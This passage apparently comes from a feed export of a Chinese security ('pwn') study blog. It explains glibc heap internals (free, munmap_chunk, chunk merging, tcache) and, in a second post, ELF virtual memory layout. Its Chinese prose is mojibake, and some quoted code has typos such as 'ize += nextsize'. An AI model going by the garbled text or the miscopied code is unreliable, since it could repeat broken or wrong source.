·çš„è°ƒç”¨ï¼Œå³ä»€ä¹ˆéƒ½ä¸åšï¼Œç›´æ¥è¿”å›</li><li>part3ï¼šåˆ¤æ–­æ‰€é‡Šæ”¾çš„ç©ºé—´æ˜¯ä¸æ˜¯ä½¿ç”¨mmapåˆ†é…å¾—åˆ°çš„ï¼Œå¦‚æœæ˜¯mmapåˆ†é…å¾—åˆ°çš„ï¼Œå°±ä½¿ç”¨munmapæ¥é‡Šæ”¾ï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå°±è°ƒç”¨_int_freeè¿™ä¸ªä¸»é‡Šæ”¾å‡½æ•°æ¥é‡Šæ”¾ï¼Œåé¢å°±æ¥é‡ç‚¹åˆ†æè¿™ä¸ªå‡½æ•°</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>å…ˆè´´æµç¨‹</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>æ ¹æ®ä¸Šå›¾ï¼Œfreeæ—¶å…ˆæ˜¯åˆ¤æ–­chunk sizeæ˜¯ä¸æ˜¯å¤„åœ¨fast binçš„èŒƒå›´ï¼Œæ˜¯çš„è¯å°±æŠŠè¯¥chunkæ”¾å…¥fast binä¸­ï¼ŒæŠŠchunkæ”¾å…¥fast binçš„æ“ä½œæ˜¯ä¸€ä¸ªCASæ“ä½œ.</p><p>é€šè¿‡ä»£ç å®ç°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç é™¤äº†å‰é¢æåˆ°çš„CASæ“ä½œï¼Œè¿˜æœ‰ä¸¤ä¸ªç‚¹å€¼å¾—æ³¨æ„ä¸€ä¸‹ï¼š</p><ul><li>ä½¿ç”¨free<em>perturbå‡½æ•°æ¥æ”¹å˜ä¸€ä¸‹æ‰€é‡Šæ”¾ç©ºé—´çš„åŸæ¥å†…å®¹ï¼Œè¿™ä¸ªè¦åœ¨è®¾ç½®äº†glibc.malloc.perturbæˆ–è€…MALLOC_PERTURB</em>ç¯å¢ƒå˜é‡çš„æ—¶å€™æ‰ä¼šèµ·ä½œç”¨</li><li>PROTECT_PTRçš„åº•å±‚åŸç†å®é™…ä¸Šæ˜¯ä¸€ç§safe-linkingçš„å®‰å…¨æœºåˆ¶ï¼Œå®ƒåˆ©ç”¨äº†ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰ä¸­çš„éšæœºæ€§ï¼Œå¯ä»¥å¾ˆæœ‰æ•ˆçš„é˜²æ­¢UAFæ¼æ´ï¼Œè¿™éƒ¨åˆ†å¾ˆæœ‰æ„æ€ï¼Œé»‘å®¢çš„å…¥é—¨é¢˜ï¼Œä»¥åæœ‰æ—¶é—´å†ä¸“é—¨å†™ç¯‡æ–‡ç« ç ”ç©¶ä¸‹ï¼Œè¿™é‡Œåªç®€å•æä¸‹</li></ul><p>å¦‚æœchunk sizeä¸å±äºfast binçš„èŒƒå›´ï¼Œç»§ç»­åˆ¤æ–­æ˜¯ä¸æ˜¯ç”±mmapåˆ†é…äº§ç”Ÿï¼Œå¦‚æœç”±mmapåˆ†é…äº§ç”Ÿï¼Œåˆ™ä½¿ç”¨munmap_chunkè¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œfreeï¼Œmunmap_chunkçš„ä¸»è¦ä»£ç ä¹Ÿä¸€å¹¶åˆ—åœ¨äº†ä¸‹é¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœç©ºé—´æ˜¯ç”±mmapåˆ†é…çš„ï¼Œåˆ™ä½¿ç”¨munmap_chunké‡Šæ”¾</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunkçš„ä¸»è¦å®ç°</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLROæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥å®ï¼Œè¿™é‡ŒæŠŠdl_pagesize</span></span><br><span class="line">  <span class="comment">// å˜æˆäº†_dl_pagesizeï¼Œ_dl_pagesizeçš„å€¼æ˜¯4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// é€šè¿‡ä¸‹é¢è¿™ä¸ªcheckå¯ä»¥å‘ç°ï¼Œmmapåˆ†é…çš„</span></span><br><span class="line">  <span class="comment">// ç©ºé—´åœ°å€å’Œå¤§å°éƒ½å¿…é¡»æ˜¯pagesizeçš„å€æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç»§ç»­è°ƒç”¨__munmapæ¥è¿›è¡Œé‡Šæ”¾ï¼Œ</span></span><br><span class="line">  <span class="comment">// è¿½è¸ªä»£ç å¯ä»¥çœ‹åˆ°æ˜¯ç”±_vm_deallocateé‡Šæ”¾çš„ç©ºé—´</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆ¤æ–­çš„åŸç†å¾ˆç®€å•ï¼Œéƒ½çŸ¥é“mallocçš„chunk headerä¸­æœ‰Aã€Mã€P 3ä¸ªbitçš„flagï¼Œå…¶ä¸­çš„Må°±æ˜¯è¡¨ç¤ºè¯¥chunkæ˜¯ä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨äº§ç”Ÿï¼Œè¿™ä¸ªåˆ¤æ–­å®å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>å¦‚æœchunkä¸æ˜¯ç”±mmapåˆ†é…ï¼Œå…ˆåˆ¤æ–­è¯¥chunkçš„prev chunkæ˜¯ä¸æ˜¯free stateï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œéœ€è¦å’Œprev chunkè¿›è¡Œmergeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†åˆ¤æ–­next chunkæ˜¯ä¸æ˜¯top chunkï¼Œæ˜¯çš„è¯ï¼Œé‡æ–°è®¾ç½®top chunkï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœnext chunkä¸æ˜¯top chunkï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œå¦‚æœæ˜¯free stateçš„è¯ï¼Œåˆ™ç»§ç»­mergeï¼Œå¦‚æœæ˜¯allocated stateçš„è¯ï¼Œåˆ™æ”¹å˜å…¶P(PREV_INUSE) flagï¼Œæœ€åæŠŠè¦freeçš„chunkæ”¾å…¥unsorted binä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>æœ€åè¿˜è¦çœ‹ä¸‹mergeè¿‡åçš„chunk sizeæ˜¯å¦è¾¾åˆ°FASTBIN_CONSOLIDATION_THRESHOLDè¿™ä¸ªé˜ˆå€¼ï¼ˆé»˜è®¤å¤§å°æ˜¯65536ï¼‰ï¼Œè¾¾åˆ°çš„è¯è¦åšä¸€æ¬¡malloc_consolidateæ“ä½œï¼ˆfree fast binä¸­çš„chunkåˆ°unsorted binä¸­ï¼‰ï¼Œå¯¹émain arenaè¿˜è¦åšä¸€ä¸‹heap_trimæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­çš„heap_for_ptrè¿™ä¸ªå®æ˜¯ç”¨æ¥å¾—åˆ°å½“å‰heapçš„heap_infoçš„ï¼Œä»å®ƒçš„å®šä¹‰å¯ä»¥éªŒè¯heap_infoè¿™ä¸ªæ•°æ®ç»“æ„çš„ä¸€äº›ç‰¹æ€§ï¼Œå€¼å¾—çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="æœ‰tcache"><a href="#æœ‰tcache" class="headerlink" title="æœ‰tcache"></a>æœ‰tcache</h1><p>ä»¥ä¸Šéƒ½æ˜¯ä¸è€ƒè™‘tcacheçš„æƒ…å†µï¼ˆlibc&lt;2.26)ï¼Œæœ‰tcacheå…¶å®å˜åŒ–ä¹Ÿå¹¶ä¸æ˜¯å¤ªå¤§ã€‚</p><p>ç›¸å…³æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcacheä¹Ÿæ˜¯ä½¿ç”¨ ç±»ä¼¼ bins æ–¹å¼æ¥ç®¡ç†tcache ã€‚</p><p><strong>tcache_perthread_structæ˜¯æ•´ä¸ªtcache</strong></p><p>æ¯ä¸€é¡¹ç”± ç›¸åŒå¤§å°çš„ chunk é€šè¿‡ tcache_entry ä½¿ç”¨å•å‘é“¾è¡¨é“¾æ¥ï¼ˆç±»ä¼¼äºfastbinçš„é“¾æ¥æ–¹å¼ï¼‰ã€‚</p><p><strong>counts ç”¨äºè®°å½• entries ä¸­æ¯ä¸€é¡¹å½“å‰é“¾å…¥çš„ chunk æ•°ç›®ï¼Œ æœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkã€‚</strong></p><p>tcache_entry ç”¨äºé“¾æ¥ chunk çš„ç»“æ„ä½“ï¼Œ å…¶ä¸­å°±ä¸€ä¸ª next æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªç›¸åŒå¤§å°çš„ chunk.</p><h2 id="åŸºç¡€æ“ä½œ"><a href="#åŸºç¡€æ“ä½œ" class="headerlink" title="åŸºç¡€æ“ä½œ"></a>åŸºç¡€æ“ä½œ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// å¢åŠ åˆ°é“¾è¡¨å¤´éƒ¨</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// è®°å½•å½“å‰ bin çš„ chunkæ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ®µä»£ç èƒ½æ›´å¥½åœ°ç†è§£ä¸Šé¢ä¸¤ä¸ªç»“æ„ä½“.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>ç”¨äºæŠŠä¸€ä¸ª chunk æ”¾åˆ° æŒ‡å®šçš„ tcache-&gt;entries é‡Œé¢å»ï¼Œ tc_idx é€šè¿‡ csize2tidx (nb) è®¡ç®—å¾—åˆ° ï¼ˆnbæ˜¯ chunk çš„å¤§å°ï¼‰ã€‚</p><p>å®ƒé¦–å…ˆæŠŠ chunk+2<em>SIZE_SZ ï¼ˆå°±æ˜¯é™¤å» header éƒ¨åˆ†ï¼‰ å¼ºåˆ¶è½¬æ¢æˆ tcache_entry </em> ç±»å‹ï¼ŒeæŒ‡é’ˆä¹Ÿå°±æŒ‡å‘äº†mem,ç„¶åä¿®æ”¹memçš„å¤´å­—æ®µ(ç°åœ¨è¢«è§†ä¸ºenteryçš„nextæŒ‡é’ˆ)ä¸ºä¹‹å‰çš„è¯¥enteryçš„ç¬¬ä¸€ä¸ªchunk,ç„¶åå†æŠŠenteryçš„å€¼æ”¹ä¸ºeæŒ‡é’ˆ,æœ€åæŠŠ tcache-&gt;counts[tc_idx] åŠ  1 ï¼Œè¡¨ç¤ºæ–°å¢äº†ä¸€ä¸ª chunk åˆ° è¯¥ è¡¨é¡¹ã€‚</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>ç®€å•æ¥è¯´å°±æ˜¯putçš„é€†æ“ä½œ,ä¸å¤šè¯´.</p><p><strong>å¾—åˆ°tc_idxçš„å®å®šä¹‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬å·¥ä½œ"><a href="#åŸºæœ¬å·¥ä½œ" class="headerlink" title="åŸºæœ¬å·¥ä½œ"></a>åŸºæœ¬å·¥ä½œ</h2><ul><li><p>ç¬¬ä¸€æ¬¡ malloc æ—¶ï¼Œä¼šå…ˆ malloc ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾ <strong>tcache_perthread_struct</strong> ã€‚</p></li><li><p>free å†…å­˜ï¼Œä¸” size å°äº small bin size æ—¶</p><ul><li>å…ˆæ”¾åˆ°å¯¹åº”çš„ tcache ä¸­ï¼Œç›´åˆ° tcache è¢«å¡«æ»¡ï¼ˆé»˜è®¤æ˜¯ 7 ä¸ªï¼‰ï¼ˆ<strong>pä½ä¸ç½®é›¶æ•…ä¸åˆå¹¶</strong>ï¼‰</li><li>tcache è¢«å¡«æ»¡ä¹‹åï¼Œå†æ¬¡ free çš„å†…å­˜å’Œä¹‹å‰ä¸€æ ·è¢«æ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­</li><li>tcache ä¸­çš„ chunk ä¸ä¼šåˆå¹¶ï¼ˆä¸å–æ¶ˆ inuse bitï¼‰</li></ul></li><li><p>malloc å†…å­˜ï¼Œä¸” size åœ¨ tcache èŒƒå›´å†…</p><ul><li><p>å…ˆä» tcache å– chunkï¼Œç›´åˆ° tcache ä¸ºç©º</p></li><li><p>tcache ä¸ºç©ºåï¼Œä» bin ä¸­æ‰¾</p></li><li><p>tcache ä¸ºç©ºæ—¶ï¼Œå¦‚æœ <strong>fastbin/smallbin/unsorted bin</strong>ä¸­æœ‰ size ç¬¦åˆçš„ chunkï¼Œä¼šå…ˆæŠŠ <strong>fastbin/smallbin/unsorted bin</strong> ä¸­çš„ chunk æ”¾åˆ° tcache ä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¹‹åå†ä» tcache ä¸­å–ï¼›å› æ­¤ chunk åœ¨ bin ä¸­å’Œ tcache ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</p></li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>è¿™ç¯‡æ–‡ç« è¾ƒä¸Šä¸€ç¯‡æ›´å¤šä¸œè¥¿æ˜¯ç¼ä¸Šå»çš„,å½’çº³æ•´ç†çš„æˆåˆ†æ›´å¤š,è‡ªå·±æ€»ç»“çš„å°‘ä¸€ç‚¹ã€‚</p>]]></content>
    
    
    <summary type="html">æ›´æ·±å…¥ä¸€ç‚¹ç‚¹</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="å †" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>åŸºç¡€æ‚çƒ©</title>
    <link href="https://ixout.github.io/posts/32771/"/>
    <id>https://ixout.github.io/posts/32771/</id>
    <published>2023-03-18T07:16:02.000Z</published>
    <updated>2023-03-18T07:38:37.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°è‡ªå·±å¯¹ä¸€äº›è®¡ç®—æœºç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†å¹¶ä¸äº†è§£ï¼Œç›®å‰æš‚æ—¶ä¹Ÿæ²¡æœ‰ç²¾åŠ›å»ç³»ç»Ÿçš„å­¦ä¹ ï¼Œäºæ˜¯å°±å°†ç»å¸¸é‡åˆ°çš„åˆä¸æ‡‚çš„çŸ¥è¯†å½’çº³ä¸€ä¸‹</p><hr><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„"><a href="#è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„" class="headerlink" title="è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„"></a>è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</h2><p>å…ˆçœ‹ä¸€ä¸‹è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ€»ä½“å¸ƒå±€ï¼Œä»¥32ä½Linuxç³»ç»Ÿä¸ºä¾‹ï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>åŸºäºä¸Šå›¾çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¸ƒå±€æ¥ç®€å•è¯´ä¸‹ELFæ–‡ä»¶æ˜¯æ€æ ·æ˜ å°„åˆ°è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ï¼ŒELFæ–‡ä»¶è¢«ç»„ç»‡æˆå¦‚ä¸‹å›¾å·¦åˆ—å‡ºçš„ä¸€ç³»åˆ—sectionï¼Œå…¶ä¸­å…·æœ‰ç›¸åŒå±æ€§ï¼ˆR/W/Eï¼‰çš„sectionå†ç»„æˆä¸€ä¸ªsegmentï¼Œä»¥segmentä¸ºå•ä½æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå…¶ä¸­è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„segmentè¦åšåˆ°é¡µå¤§å°å¯¹é½ï¼Œä¸‹å›¾ä¹Ÿä¸€åŒç®€è¦å±•ç¤ºäº†è™šæ‹Ÿåœ°å€ç©ºé—´åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œé€šè¿‡MMUå®Œæˆã€‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>å…¶å®ƒç³»ç»ŸåŸç†ç±»ä¼¼ï¼Œéƒ½æ˜¯å°†å¯æ‰§è¡Œç¨‹åºç»„ç»‡æˆè‹¥å¹²segmentè¿åŒç”¨åˆ°çš„åŠ¨æ€åº“å’Œkernelæ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¸»è¦å·®åˆ«åœ¨äºä¸åŒsegmentæ˜ å°„çš„èµ·å§‹åœ°å€ã€å¤§å°ä¸åŒç­‰ï¼Œæ¯”å¦‚32ä½Linuxç³»ç»Ÿçš„Text segmentèµ·å€æ˜¯0x08048000ï¼Œ64ä½Linuxç³»ç»Ÿçš„Text segmentèµ·å€æ˜¯0x00400000ï¼Œå†æ¯”å¦‚ç›¸å¯¹32ä½Linuxç³»ç»Ÿçš„kernel spaceæ˜¯1Gï¼Œ32ä½Windowsçš„kernel spaceæ˜¯2Gç­‰ç­‰ã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€äº›ååˆ†åŸºç¡€çš„ä¸œè¥¿</summary>
    
    
    
